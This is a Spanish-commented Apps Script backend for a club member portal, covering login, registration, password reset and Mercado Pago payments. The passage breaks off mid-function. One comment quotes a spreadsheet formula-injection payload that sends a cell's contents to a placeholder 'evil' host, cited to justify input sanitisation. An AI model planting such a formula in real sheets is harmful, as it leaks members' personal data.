/**
 * Club S. y D. Agronomía Central — Backend de socios
 * --------------------------------------------------
 * Apps Script bound a la planilla "AC - Socios".
 * Expone un endpoint POST que valida credenciales contra la hoja "Socios"
 * y devuelve el estado de cuenta del socio autenticado.
 *
 * Seguridad:++
 *  - Contraseñas hasheadas con SHA-256 + salt único por socio.
 *  - Rate limit (5 intentos / 15 min) por email vía CacheService.
 *  - Tokens de sesión firmados con HMAC-SHA256 y expiración (30 min).
 *  - Comparación constant-time para evitar timing attacks.
 *  - Cada login (éxito o fallo) queda en la hoja "Auditoria".
 */

const SECRET_PROP = 'HMAC_SECRET';
const MP_TOKEN_PROP = 'MP_ACCESS_TOKEN';
const TOKEN_TTL_MS = 30 * 60 * 1000;          // 30 minutos
const MAX_LOGIN_ATTEMPTS = 5;
const LOCK_TTL_SEC = 15 * 60;                 // 15 minutos
const SHEET_SOCIOS = 'Socios';
const SHEET_CUOTAS = 'Cuotas';
const SHEET_CONFIG = 'Config';
const SHEET_AUDIT = 'Auditoria';
const SHEET_PAGOS = 'Pagos';
const MP_API_BASE = 'https://api.mercadopago.com';

const MES_NUM = {
  Enero: 1, Febrero: 2, Marzo: 3, Abril: 4, Mayo: 5, Junio: 6,
  Julio: 7, Agosto: 8, Septiembre: 9, Octubre: 10, Noviembre: 11, Diciembre: 12
};

// ============================================================
// HTTP entrypoint
// ============================================================
function doPost(e) {
  let body;
  try {
    body = JSON.parse(e.postData.contents);
  } catch (err) {
    return jsonResponse({ ok: false, error: 'bad_request' });
  }

  try {
    switch (body.action) {
      case 'login':                return jsonResponse(handleLogin(body));
      case 'session':              return jsonResponse(handleSession(body));
      case 'register':             return jsonResponse(handleRegister(body));
      case 'requestPasswordReset': return jsonResponse(handleRequestPasswordReset(body));
      case 'confirmPasswordReset': return jsonResponse(handleConfirmPasswordReset(body));
      case 'createPayment':        return jsonResponse(handleCreatePayment(body));
      case 'confirmPayment':       return jsonResponse(handleConfirmPayment(body));
      default:                     return jsonResponse({ ok: false, error: 'unknown_action' });
    }
  } catch (err) {
    log('error', body.email || '', body.action || '', String(err && err.message || err));
    return jsonResponse({ ok: false, error: 'server_error' });
  }
}

function doGet() {
  // Útil para verificar que el deploy responde. No expone datos.
  return jsonResponse({ ok: true, service: 'ac-socios', version: 1 });
}

function jsonResponse(data) {
  return ContentService
    .createTextOutput(JSON.stringify(data))
    .setMimeType(ContentService.MimeType.JSON);
}

// ============================================================
// Acciones
// ============================================================
function handleLogin(body) {
  const email = String(body.email || '').toLowerCase().trim();
  const password = String(body.password || '');

  if (!email || !password) return { ok: false, error: 'missing_credentials' };
  if (email.length > 120 || password.length > 100) return { ok: false, error: 'invalid_input' };

  const cache = CacheService.getScriptCache();
  const lockKey = 'lock:' + email;
  if (cache.get(lockKey)) {
    log('lockout', maskEmailForLog_(email), 'login', 'rate_limited');
    return { ok: false, error: 'too_many_attempts' };
  }

  const socio = findSocio(email);
  if (!socio || !verifyPassword(password, socio.password_hash)) {
    const attemptKey = 'attempts:' + email;
    const attempts = parseInt(cache.get(attemptKey) || '0', 10) + 1;
    if (attempts >= MAX_LOGIN_ATTEMPTS) {
      cache.put(lockKey, '1', LOCK_TTL_SEC);
      cache.remove(attemptKey);
    } else {
      cache.put(attemptKey, String(attempts), LOCK_TTL_SEC);
    }
    log('login', maskEmailForLog_(email), 'login', 'failed');
    return { ok: false, error: 'invalid_credentials' };
  }

  // Validar estado de la cuenta (pendiente puede entrar y ver UI especial,
  // rechazado y desactivado se bloquean en el login).
  const estado = String(socio.estado || 'activo').toLowerCase().trim();
  if (estado === 'rechazado') {
    log('login', email, 'login', 'rejected_account');
    return { ok: false, error: 'account_rejected' };
  }
  if (estado === 'desactivado') {
    log('login', email, 'login', 'deactivated_account');
    return { ok: false, error: 'account_deactivated' };
  }

  cache.remove('attempts:' + email);
  log('login', email, 'login', 'success_' + estado);

  // Auto-upgrade transparente: si el hash es del formato sha256 viejo,
  // lo re-hasheamos a PBKDF2 ahora que tenemos la password en claro.
  // Si lo upgradeamos, releemos el socio para que pwd_check del token
  // refleje el hash NUEVO (sino el token nace inválido).
  let socioFresh = socio;
  if (String(socio.password_hash || '').indexOf('sha256:') === 0) {
    upgradePasswordHash_(email, password);
    socioFresh = findSocio(email) || socio;
  }

  const token = signToken({
    email: email,
    exp: Date.now() + TOKEN_TTL_MS,
    pwd_check: passwordCheck_(socioFresh.password_hash)
  });
  return buildSessionPayload(socioFresh, email, token);
}

function handleSession(body) {
  // Pre-check rápido (firma + exp) antes de tocar la sheet
  const peek = verifyToken(body.token);
  if (!peek) return { ok: false, error: 'invalid_token' };
  const email = String(peek.email || '').toLowerCase().trim();
  const socio = findSocio(email);
  if (!socio) return { ok: false, error: 'user_not_found' };
  // Validación final: el pwd_check del token debe matchear el password_hash actual.
  // Si el socio cambió la password (reset, edición manual), el token queda inválido.
  if (!verifyTokenForSocio_(body.token, socio)) return { ok: false, error: 'invalid_token' };
  return buildSessionPayload(socio, email, body.token);
}

function buildSessionPayload(socio, email, token) {
  const estadoCuenta = String(socio.estado || 'activo').toLowerCase().trim();
  const socioId = String(socio.socio_id || '').trim();
  // Si la cuenta está pendiente, no devolvemos cuotas: el portal la renderiza
  // como "esperando aprobación" y no muestra estado de cuenta.
  const cuotas = (estadoCuenta === 'pendiente' || !socioId) ? [] : getCuotasFor(socioId);
  const tieneDeuda = cuotas.some(function (c) { return c.estado !== 'pagado'; });
  const config = getConfig();
  // Le avisamos al frontend si MP está habilitado, sin exponer el token.
  config.mp_enabled = !!PropertiesService.getScriptProperties().getProperty(MP_TOKEN_PROP);

  // fecha_alta puede venir como Date o string; normalizamos a YYYY-MM-DD
  let fechaAlta = socio.fecha_alta || '';
  if (fechaAlta instanceof Date) fechaAlta = formatDateISO_(fechaAlta);

  return {
    ok: true,
    token: token,
    user: {
      socio_id: socioId,
      email: email,
      nombre: socio.nombre || '',
      dorsal: String(socio.dorsal || ''),
      categoria: socio.categoria || '',
      telefono: String(socio.telefono || ''),
      fecha_alta: String(fechaAlta || ''),
      estado: tieneDeuda ? 'deuda' : 'al_dia',          // estado financiero
      estado_cuenta: estadoCuenta                        // estado administrativo (pendiente|activo)
    },
    cuotas: cuotas,
    config: config
  };
}

function formatDateISO_(d) {
  return d.getFullYear() + '-' +
    ('0' + (d.getMonth() + 1)).slice(-2) + '-' +
    ('0' + d.getDate()).slice(-2);
}

// ============================================================
// Registro de socio (auto-alta con aprobación pendiente)
// ============================================================
function handleRegister(body) {
  // Honeypot — campo oculto que humanos no llenan, bots sí. Si está lleno
  // devolvemos OK falso para no darles feedback de que fueron detectados.
  if (body.website && String(body.website).trim().length > 0) {
    return { ok: true, status: 'pending' };
  }

  const email = String(body.email || '').toLowerCase().trim();
  const password = String(body.password || '');
  const nombre = String(body.nombre || '').trim();
  const dni = String(body.dni || '').replace(/\D/g, '');
  const telefono = String(body.telefono || '').trim();
  const categoria = String(body.categoria || '').trim();

  // Validaciones server-side (no se confía en lo que valida el frontend)
  if (!email || !password || !nombre || !dni || !telefono || !categoria) {
    return { ok: false, error: 'missing_fields' };
  }
  if (email.length > 120 || nombre.length > 80 || telefono.length > 25 || categoria.length > 60) {
    return { ok: false, error: 'invalid_input' };
  }
  if (password.length < 8 || password.length > 100) {
    return { ok: false, error: 'weak_password' };
  }
  if (!/^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/i.test(email)) {
    return { ok: false, error: 'invalid_email' };
  }
  if (dni.length < 7 || dni.length > 9) {
    return { ok: false, error: 'invalid_dni' };
  }

  // Rate limit global por IP no es posible en Apps Script (no expone IP),
  // pero hacemos un cooldown por email para frenar repetición rápida del mismo
  // formulario.
  const cache = CacheService.getScriptCache();
  const cdKey = 'register_cd:' + email;
  if (cache.get(cdKey)) {
    return { ok: false, error: 'too_fast' };
  }
  cache.put(cdKey, '1', 60); // 60s entre intentos al mismo email

  const sheet = SpreadsheetApp.getActive().getSheetByName(SHEET_SOCIOS);
  if (!sheet) return { ok: false, error: 'server_error' };

  const data = sheet.getDataRange().getValues();
  const headers = data[0].map(String);
  const emailCol = headers.indexOf('email');
  const dniCol = headers.indexOf('dni');

  // Email duplicado (cuenta existente)
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][emailCol]).toLowerCase().trim() === email) {
      return { ok: false, error: 'email_exists' };
    }
    if (dniCol >= 0 && String(data[i][dniCol]).replace(/\D/g, '') === dni) {
      return { ok: false, error: 'dni_exists' };
    }
  }

  // Generar socio_id correlativo (busca el último AC-XXXX usado)
  const sIdCol = headers.indexOf('socio_id');
  let maxId = 0;
  if (sIdCol >= 0) {
    for (let i = 1; i < data.length; i++) {
      const id = String(data[i][sIdCol] || '');
      const m = id.match(/^AC-(\d+)$/);
      if (m) maxId = Math.max(maxId, parseInt(m[1], 10));
    }
  }
  const socioId = 'AC-' + ('0000' + (maxId + 1)).slice(-4);

  // Construir fila respetando el orden actual de columnas
  const passwordHash = hashPassword(password);
  const today = new Date();
  const fechaAlta = today.getFullYear() + '-' +
    String(today.getMonth() + 1).padStart(2, '0') + '-' +
    String(today.getDate()).padStart(2, '0');

  const newRow = headers.map(function (h) {
    switch (h) {
      case 'socio_id':      return socioId;
      case 'email':         return email;
      case 'password_hash': return passwordHash;
      case 'password_plain':return '';
      // Anti sheet-injection en TODOS los inputs del usuario:
      // si la secretaría abre la planilla, no queremos que un nombre como
      // "=HYPERLINK(\"https://evil/?d=\"&E2,...)" se evalúe como fórmula.
      case 'nombre':        return sheetSafe_(nombre);
      case 'dni':           return sheetSafe_(dni);
      case 'dorsal':        return '';
      case 'categoria':     return sheetSafe_(categoria);
      case 'telefono':      return sheetSafe_(telefono);
      case 'estado':        return 'pendiente';
      case 'fecha_alta':    return fechaAlta;
      default:              return '';
    }
  });

  sheet.appendRow(newRow);
  log('register', email, 'register', 'pending_review:' + socioId);

  // Notificación a la secretaría (best effort, no rompe si falla)
  notifySecretaria({
    email: email, nombre: nombre, dni: dni, telefono: telefono, categoria: categoria
  });

  return { ok: true, status: 'pending' };
}

// ============================================================
// Reset de contraseña self-service (código por email)
// ============================================================
function handleRequestPasswordReset(body) {
  const email = String(body.email || '').toLowerCase().trim();
  // Mensaje genérico (no revelamos si el email existe — anti enumeration)
  const generic = { ok: true, message: 'Si tu email está registrado, te llegará un código en unos minutos.' };

  if (!email || !/^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/i.test(email)) return generic;

  const cache = CacheService.getScriptCache();
  // Cooldown de 60s por email para frenar abuso
  if (cache.get('reset_cd:' + email)) return generic;
  cache.put('reset_cd:' + email, '1', 60);

  const socio = findSocio(email);
  if (!socio) {
    log('reset', maskEmailForLog_(email), 'requestReset', 'email_not_found');
    return generic;
  }

  // Bloqueamos resets para cuentas no activas (rechazadas o desactivadas)
  const estado = String(socio.estado || 'activo').toLowerCase().trim();
  if (estado === 'rechazado' || estado === 'desactivado') {
    log('reset', maskEmailForLog_(email), 'requestReset', 'blocked_estado_' + estado);
    return generic;
  }

  // Código de 6 dígitos generado con CSPRNG (no Math.random — predecible)
  const code = String(randomInt_(100000, 999999));
  cache.put('reset_code:' + email, code, 900);

  try {
    const subject = '[Agronomía Central] Código para restablecer tu contraseña';
    const body =
      'Hola ' + (socio.nombre || '') + ',\n\n' +
      'Recibimos una solicitud para restablecer tu contraseña del portal del socio.\n\n' +
      'Tu código es: ' + code + '\n\n' +
      'Es válido por 15 minutos. Si no fuiste vos, ignorá este mail — tu contraseña no cambia hasta que alguien use el código.\n\n' +
      '— Club S. y D. Agronomía Central';
    MailApp.sendEmail(email, subject, body);
    log('reset', email, 'requestReset', 'code_sent');
  } catch (e) {
    log('error', email, 'requestReset', 'mail_failed:' + (e && e.message));
  }

  return generic;
}

function handleConfirmPasswordReset(body) {
  const email = String(body.email || '').toLowerCase().trim();
  const code = String(body.code || '').trim();
  const newPassword = String(body.password || '');

  if (!email || !code || !newPassword) return { ok: false, error: 'missing_fields' };
  if (newPassword.length < 8 || newPassword.length > 100) return { ok: false, error: 'weak_password' };
  if (!/^\d{6}$/.test(code)) return { ok: false, error: 'invalid_code' };

  const cache = CacheService.getScriptCache();
  const expected = cache.get('reset_code:' + email);
  if (!expected || expected !== code) {
    log('reset', maskEmailForLog_(email), 'confirmReset', 'invalid_or_expired_code');
    return { ok: false, error: 'invalid_code' };
  }

  // Buscar y actualizar
  const sheet = SpreadsheetApp.getActive().getSheetByName(SHEET_SOCIOS);
  if (!sheet) return { ok: false, error: 'server_error' };
  const data = sheet.getDataRange().getValues();
  const headers = data[0].map(String);
  const emailCol = headers.indexOf('email');
  const hashCol = headers.indexOf('password_hash');
  if (emailCol < 0 || hashCol < 0) return { ok: false, error: 'server_error' };

  for (let i = 1; i < data.length; i++) {
    if (String(data[i][emailCol]).toLowerCase().trim() === email) {
      sheet.getRange(i + 1, hashCol + 1).setValue(hashPassword(newPassword));
      cache.remove('reset_code:' + email);
      cache.remove('reset_cd:' + email);
      // Invalidar también cualquier intento de login bloqueado
      cache.remove('lock:' + email);
      cache.remove('attempts:' + email);
      // Cambiar el password_hash invalida automáticamente todos los tokens
      // viejos vía pwd_check (ver verifyTokenForSocio_).
      log('reset', email, 'confirmReset', 'password_updated');
      return { ok: true, message: 'Contraseña actualizada. Ya podés ingresar.' };
    }
  }
  // No matchea: mantener mensaje genérico
  return { ok: false, error: 'invalid_code' };
}

function notifySecretaria(socio) {
  try {
    const config = getConfig();
    const to = config.notification_email;
    if (!to) return; // si no se configuró, no rompe
    const subject = '[Agronomía Central] Nueva solicitud de socio: ' + socio.nombre;
    const body =
      'Llegó una nueva solicitud de alta para revisar:\n\n' +
      'Nombre: ' + socio.nombre + '\n' +
      'DNI: ' + socio.dni + '\n' +
      'Email: ' + socio.email + '\n' +
      'Teléfono: ' + socio.telefono + '\n' +
      'Categoría solicitada: ' + socio.categoria + '\n\n' +
      'Para aprobarlo, abrí la planilla AC - Socios y cambiá la columna "estado" ' +
      'de "pendiente" a "activo" en la fila del socio.\n\n' +
      'Para rechazarlo, cambiá "estado" a "rechazado".\n\n' +
      '— Sistema AC Socios';
    MailApp.sendEmail(to, subject, body);
  } catch (e) {
    // Cuotas de mail agotadas o config rota: dejamos rastro pero no rompemos.
    log('error', socio.email, 'notifySecretaria', String(e && e.message || e));
  }
}

// ============================================================
// Mercado Pago - crear preferencia de pago
// ============================================================
function handleCreatePayment(body) {
  const peek = verifyToken(body.token);
  if (!peek) return { ok: false, error: 'invalid_token' };
  const email = String(peek.email || '').toLowerCase().trim();
  const socio = findSocio(email);
  if (!socio) return { ok: false, error: 'user_not_found' };
  if (!verifyTokenForSocio_(body.token, socio)) return { ok: false, error: 'invalid_token' };
  const socioId = String(socio.socio_id || '').trim();
  if (!socioId) return { ok: false, error: 'socio_id_missing' };

  const items = Array.isArray(body.items) ? body.items : [];
  if (items.length === 0) return { ok: false, error: 'empty_cart' };
  if (items.length > 24) return { ok: false, error: 'too_many_items' };

  // Resolver cada cuota desde la sheet (no se confía en los montos del frontend)
  const cuotas = getCuotasFor(socioId);
  const selected = [];
  for (let i = 0; i < items.length; i++) {
    const it = items[i];
    // Match por cuota_id si vino, si no por mes+anio (compat con frontend viejo)
    let found = null;
    if (it.cuota_id) {
      found = cuotas.filter(function (c) { return c.cuota_id === it.cuota_id; })[0];
    } else {
      found = cuotas.filter(function (c) {
        return c.mes === it.mes && Number(c.anio) === Number(it.anio);
      })[0];
    }
    if (!found) return { ok: false, error: 'cuota_not_found' };
    if (found.estado === 'pagado') return { ok: false, error: 'cuota_already_paid' };
    selected.push(found);
  }

  const accessToken = PropertiesService.getScriptProperties().getProperty(MP_TOKEN_PROP);
  if (!accessToken) {
    log('payment', email, 'createPayment', 'mp_not_configured');
    return { ok: false, error: 'mp_not_configured' };
  }

  const baseUrl = String(body.base_url || '').replace(/\?.*$/, '');

  const preference = {
    items: selected.map(function (c) {
      // Si la cuota tiene saldo (parcial), cobramos solo el saldo restante.
      const cobrar = c.saldo > 0 ? c.saldo : c.monto;
      const titulo = c.saldo > 0 && c.saldo < c.monto
        ? 'Saldo cuota ' + c.mes + ' ' + c.anio + ' — Club Agronomía Central'
        : 'Cuota ' + c.mes + ' ' + c.anio + ' — Club Agronomía Central';
      return {
        title: titulo,
        quantity: 1,
        unit_price: Number(cobrar),
        currency_id: 'ARS'
      };
    }),
    payer: { email: email, name: socio.nombre || undefined },
    external_reference: socioId + '|' + selected.map(function (c) { return c.cuota_id; }).join(','),
    statement_descriptor: 'AC-CLUB',
    metadata: {
      socio_id: socioId,
      socio_email: email,
      socio_nombre: socio.nombre || '',
      cuota_ids: selected.map(function (c) { return c.cuota_id; })
    }
  };

  if (baseUrl) {
    preference.back_urls = {
      success: baseUrl + '?pago=ok',
      pending: baseUrl + '?pago=pendiente',
      failure: baseUrl + '?pago=error'
    };
    preference.auto_return = 'approved';
  }

  let response;
  try {
    response = UrlFetchApp.fetch(MP_API_BASE + '/checkout/preferences', {
      method: 'post',
      contentType: 'application/json',
      headers: { 'Authorization': 'Bearer ' + accessToken },
      payload: JSON.stringify(preference),
      muteHttpExceptions: true
    });
  } catch (err) {
    log('error', email, 'createPayment', 'mp_fetch_' + (err && err.message || err));
    return { ok: false, error: 'mp_api_error' };
  }

  const status = response.getResponseCode();
  const text = response.getContentText();

  if (status >= 400) {
    log('error', email, 'createPayment', 'mp_api_' + status + ': ' + text.substring(0, 200));
    return { ok: false, error: 'mp_api_error' };
  }

  let result;
  try { result = JSON.parse(text); }
  catch (err) {
    log('error', email, 'createPayment', 'mp_parse_error');
    return { ok: false, error: 'mp_api_error' };
  }

  // Total a cobrar (suma de saldos seleccionados)
  const montoTotal = selected.reduce(function (acc, c) {
    return acc + (c.saldo > 0 ? c.saldo : c.monto);
  }, 0);

  // Registrar la intención de pago en Pagos como 'iniciado'.
  // Se confirma luego cuando el usuario vuelve del checkout y el server
  // verifica contra MP que efectivamente se aprobó.
  recordPago_(
    socioId,
    montoTotal,
    'mp',
    String(result.id),
    selected.map(function (c) { return c.cuota_id; }),
    'iniciado',
    'Preference creada: ' + selected.length + ' cuota(s)'
  );

  log('payment', email, 'createPayment', 'preference_created:' + result.id + ' total=' + montoTotal);

  return {
    ok: true,
    init_point: result.init_point,
    sandbox_init_point: result.sandbox_init_point,
    preference_id: result.id
  };
}

// ============================================================
// Mercado Pago - confirmar pago (server-to-server al volver del checkout)
// ============================================================
// Wrapper con LockService para evitar race en applyPayment_:
// si el usuario hace doble click / refresh / abre dos pestañas,
// la confirmación serializa y solo aplica el pago una vez.
function handleConfirmPayment(body) {
  const lock = LockService.getScriptLock();
  if (!lock.tryLock(15000)) {
    return { ok: false, error: 'busy_try_again' };
  }
  try {
    return handleConfirmPaymentLocked_(body);
  } finally {
    try { lock.releaseLock(); } catch (e) {}
  }
}

function handleConfirmPaymentLocked_(body) {
  const peek = verifyToken(body.token);
  if (!peek) return { ok: false, error: 'invalid_token' };
  const email = String(peek.email || '').toLowerCase().trim();
  const socio = findSocio(email);
  if (!socio) return { ok: false, error: 'user_not_found' };
  if (!verifyTokenForSocio_(body.token, socio)) return { ok: false, error: 'invalid_token' };
  const socioId = String(socio.socio_id || '').trim();

  const preferenceId = String(body.preference_id || '').trim();
  if (!preferenceId) return { ok: false, error: 'missing_preference' };

  // Verificar que el preference_id corresponde a un pago iniciado por este socio.
  // Esto es la barrera anti-spoofing: aunque alguien adivine un preference_id ajeno,
  // no puede confirmarlo desde su cuenta porque socio_id no matchea.
  const pagos = readSheet(SHEET_PAGOS);
  const refCol = pagos.headers.indexOf('referencia');
  const sidCol = pagos.headers.indexOf('socio_id');
  const estadoCol = pagos.headers.indexOf('estado');
  const cuotasCol = pagos.headers.indexOf('cuotas_cubiertas');
  const montoCol = pagos.headers.indexOf('monto');
  const pagoRow = pagos.rows.filter(function (r) {
    return String(r[refCol]).trim() === preferenceId &&
           String(r[sidCol]).trim() === socioId;
  })[0];
  if (!pagoRow) {
    log('payment', email, 'confirmPayment', 'preference_not_found_or_wrong_socio:' + preferenceId);
    return { ok: false, error: 'preference_not_found' };
  }

  const estadoActual = String(pagoRow[estadoCol] || '').toLowerCase().trim();
  if (estadoActual === 'confirmado') {
    // Ya estaba confirmado. Devolvemos sesión refrescada igual.
    log('payment', email, 'confirmPayment', 'already_confirmed:' + preferenceId);
    return buildSessionPayload(findSocio(email), email, body.token);
  }

  const accessToken = PropertiesService.getScriptProperties().getProperty(MP_TOKEN_PROP);
  if (!accessToken) {
    log('error', email, 'confirmPayment', 'mp_not_configured');
    return { ok: false, error: 'mp_not_configured' };
  }

  // Consultar a MP qué pagos hay asociados a esta preference
  let mpResp;
  try {
    mpResp = UrlFetchApp.fetch(
      MP_API_BASE + '/v1/payments/search?preference_id=' + encodeURIComponent(preferenceId),
      {
        method: 'get',
        headers: { 'Authorization': 'Bearer ' + accessToken },
        muteHttpExceptions: true
      }
    );
  } catch (err) {
    log('error', email, 'confirmPayment', 'mp_fetch_' + (err && err.message || err));
    return { ok: false, error: 'mp_api_error' };
  }

  const status = mpResp.getResponseCode();
  if (status >= 400) {
    log('error', email, 'confirmPayment', 'mp_api_' + status);
    return { ok: false, error: 'mp_api_error' };
  }

  let mpData;
  try { mpData = JSON.parse(mpResp.getContentText()); }
  catch (e) {
    log('error', email, 'confirmPayment', 'mp_parse_error');
    return { ok: false, error: 'mp_api_error' };
  }

  const results = (mpData && mpData.results) || [];
  // Tomamos el pago más reciente aprobado, si hay
  const aprobado = results.filter(function (p) { return p.status === 'approved'; })[0];
  const pendiente = results.filter(function (p) { return p.status === 'pending' || p.status === 'in_process'; })[0];

  if (!aprobado) {
    if (pendiente) {
      updatePagoEstado_(preferenceId, 'iniciado', 'MP status=' + pendiente.status + ' al ' + new Date().toISOString());
      log('payment', email, 'confirmPayment', 'still_pending:' + preferenceId);
      return {
        ok: true,
        payment_status: 'pending',
        message: 'El pago todavía no fue aprobado por MP. Reintentá en unos minutos.',
        // sesión actualizada igual (cuotas no cambian)
        session: buildSessionPayload(findSocio(email), email, body.token)
      };
    }
    // Ningún pago todavía: probablemente el usuario abandonó o canceló
    updatePagoEstado_(preferenceId, 'rechazado', 'MP no devolvió pago aprobado al ' + new Date().toISOString());
    log('payment', email, 'confirmPayment', 'rejected_or_abandoned:' + preferenceId);
    return {
      ok: true,
      payment_status: 'rejected',
      message: 'El pago fue cancelado o rechazado.',
      session: buildSessionPayload(findSocio(email), email, body.token)
    };
  }

  // Aprobado: aplicar el monto a las cuotas listadas
  const cuotaIds = String(pagoRow[cuotasCol] || '').split(',')
    .map(function (s) { return s.trim(); }).filter(Boolean);
  const montoCobrado = Number(aprobado.transaction_amount) || Number(pagoRow[montoCol]) || 0;

  const aplicacion = applyPayment_(cuotaIds, montoCobrado);

  updatePagoEstado_(
    preferenceId,
    'confirmado',
    'MP payment_id=' + aprobado.id + ' monto=' + montoCobrado +
    ' aplicado=' + aplicacion.applied.length + ' cuotas' +
    (aplicacion.leftover > 0 ? ' (sobró $' + aplicacion.leftover + ')' : '')
  );

  log('payment', email, 'confirmPayment', 'confirmed:' + preferenceId + ' payment=' + aprobado.id);

  return {
    ok: true,
    payment_status: 'approved',
    payment_id: aprobado.id,
    aplicacion: aplicacion,
    session: buildSessionPayload(findSocio(email), email, body.token)
  };
}

// ============================================================
// Lectura de planilla
// ============================================================
function readSheet(name) {
  const sheet = SpreadsheetApp.getActive().getSheetByName(name);
  if (!sheet) throw new Error('Sheet not found: ' + name);
  const data = sheet.getDataRange().getValues();
  if (data.length === 0) return { headers: [], rows: [] };
  return { headers: data[0].map(String), rows: data.slice(1) };
}

function findSocio(email) {
  const sheet = readSheet(SHEET_SOCIOS);
  const emailCol = sheet.headers.indexOf('email');
  if (emailCol < 0) throw new Error('Falta columna "email" en hoja Socios');
  for (let i = 0; i < sheet.rows.length; i++) {
    const row = sheet.rows[i];
    if (String(row[emailCol]).toLowerCase().trim() === email) {
      const obj = {};
      sheet.headers.forEach(function (h, j) { obj[h] = row[j]; });
      return obj;
    }
  }
  return null;
}

function getCuotasFor(socioId) {
  const sheet = readSheet(SHEET_CUOTAS);
  const sidCol = sheet.headers.indexOf('socio_id');
  if (sidCol < 0) return [];
  const result = [];
  sheet.rows.forEach(function (row) {
    if (String(row[sidCol]).trim() !== socioId) return;
    const obj = {};
    sheet.headers.forEach(function (h, j) {
      if (h === 'email' || h === 'socio_id') return;
      let v = row[j];
      if ((h === 'fecha_pago' || h === 'fecha_vencimiento') && v instanceof Date) v = formatDate(v);
      if (h === 'monto' || h === 'monto_pagado' || h === 'recargo') v = Number(v) || 0;
      if (h === 'anio') v = Number(v) || 0;
      obj[h] = v;
    });
    // Cómputos derivados (no se confía en lo que esté escrito en la columna estado)
    const monto = obj.monto || 0;
    const recargo = obj.recargo || 0;
    const pagado = obj.monto_pagado || 0;
    const totalCobrar = monto + recargo;
    obj.recargo = recargo;
    obj.total_cobrar = totalCobrar;
    obj.saldo = Math.max(0, totalCobrar - pagado);
    if (pagado >= totalCobrar && totalCobrar > 0) obj.estado = 'pagado';
    else if (pagado > 0)                          obj.estado = 'parcial';
    else                                          obj.estado = 'pendiente';
    result.push(obj);
  });
  return result;
}

// Localiza una cuota por su id en la hoja, devuelve la fila y el row index (1-based).
function findCuotaRow_(cuotaId) {
  const sheet = SpreadsheetApp.getActive().getSheetByName(SHEET_CUOTAS);
  const data = sheet.getDataRange().getValues();
  const headers = data[0].map(String);
  const idCol = headers.indexOf('cuota_id');
  if (idCol < 0) return null;
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][idCol]).trim() === cuotaId) {
      const obj = {};
      headers.forEach(function (h, j) { obj[h] = data[i][j]; });
      return { sheet: sheet, headers: headers, rowIndex: i + 1, data: obj };
    }
  }
  return null;
}

/**
 * Aplica un pago a una lista de cuotas (de las más viejas a las más nuevas).
 * Si el monto alcanza para todas, las marca como pagadas. Si no, deja la
 * última en parcial y devuelve cuánto sobró (o 0 si todo el monto se aplicó).
 *
 * Devuelve el detalle de cómo se distribuyó: [{cuota_id, aplicado, nuevo_saldo, nuevo_estado}].
 */
function applyPayment_(cuotaIds, montoTotal) {
  if (!Array.isArray(cuotaIds) || cuotaIds.length === 0) return { applied: [], leftover: montoTotal };

  // Resolver cada cuota_id, ordenar por anio+mes ASC (vieja primero)
  const cuotas = [];
  for (let i = 0; i < cuotaIds.length; i++) {
    const found = findCuotaRow_(cuotaIds[i]);
    if (found) cuotas.push(found);
  }
  cuotas.sort(function (a, b) {
    const ya = Number(a.data.anio) || 0, yb = Number(b.data.anio) || 0;
    if (ya !== yb) return ya - yb;
    return (MES_NUM[a.data.mes] || 0) - (MES_NUM[b.data.mes] || 0);
  });

  const today = formatDate(new Date());
  let remaining = Number(montoTotal) || 0;
  const applied = [];

  for (let k = 0; k < cuotas.length; k++) {
    if (remaining <= 0) break;
    const c = cuotas[k];
    const monto = Number(c.data.monto) || 0;
    const recargo = Number(c.data.recargo) || 0;
    const totalCobrar = monto + recargo;
    const pagadoActual = Number(c.data.monto_pagado) || 0;
    const necesita = Math.max(0, totalCobrar - pagadoActual);
    if (necesita <= 0) continue; // ya estaba pagada
    const aplica = Math.min(remaining, necesita);
    const nuevoPagado = pagadoActual + aplica;
    const nuevoSaldo = Math.max(0, totalCobrar - nuevoPagado);
    const nuevoEstado = nuevoSaldo === 0 ? 'pagado' : 'parcial';

    const mpCol = c.headers.indexOf('monto_pagado') + 1;
    const estadoCol = c.headers.indexOf('estado') + 1;
    const fpCol = c.headers.indexOf('fecha_pago') + 1;
    if (mpCol > 0)     c.sheet.getRange(c.rowIndex, mpCol).setValue(nuevoPagado);
    if (estadoCol > 0) c.sheet.getRange(c.rowIndex, estadoCol).setValue(nuevoEstado);
    if (fpCol > 0 && nuevoEstado === 'pagado' && !c.data.fecha_pago) {
      c.sheet.getRange(c.rowIndex, fpCol).setValue(today);
    }

    applied.push({
      cuota_id: c.data.cuota_id,
      aplicado: aplica,
      nuevo_pagado: nuevoPagado,
      nuevo_saldo: nuevoSaldo,
      nuevo_estado: nuevoEstado
    });
    remaining -= aplica;
  }

  return { applied: applied, leftover: remaining };
}

/**
 * Inserta una fila en la hoja Pagos. Devuelve el pago_id generado.
 */
function recordPago_(socioId, monto, metodo, referencia, cuotaIds, estado, notas) {
  const sheet = SpreadsheetApp.getActive().getSheetByName(SHEET_PAGOS);
  if (!sheet) return null;
  const headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0].map(String);
  const pagoId = String(Date.now()) + '-' + randomInt_(0, 999999);
  const now = new Date();
  const row = headers.map(function (h) {
    switch (h) {
      case 'pago_id':            return pagoId;
      case 'socio_id':           return socioId;
      case 'fecha':              return now;
      case 'monto':              return Number(monto) || 0;
      case 'metodo':             return metodo || '';
      case 'referencia':         return referencia || '';
      case 'cuotas_cubiertas':   return Array.isArray(cuotaIds) ? cuotaIds.join(',') : String(cuotaIds || '');
      case 'estado':             return estado || 'iniciado';
      case 'fecha_confirmacion': return estado === 'confirmado' ? now : '';
      case 'notas':              return notas || '';
      default:                   return '';
    }
  });
  sheet.appendRow(row);
  return pagoId;
}

/**
 * Marca una fila de Pagos como confirmada/rechazada.
 */
function updatePagoEstado_(referencia, nuevoEstado, notasExtra) {
  const sheet = SpreadsheetApp.getActive().getSheetByName(SHEET_PAGOS);
  if (!sheet) return null;
  const data = sheet.getDataRange().getValues();
  const headers = data[0].map(String);
  const refCol = headers.indexOf('referencia');
  const estadoCol = headers.indexOf('estado');
  const fcCol = headers.indexOf('fecha_confirmacion');
  const notasCol = headers.indexOf('notas');
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][refCol]).trim() === String(referencia).trim()) {
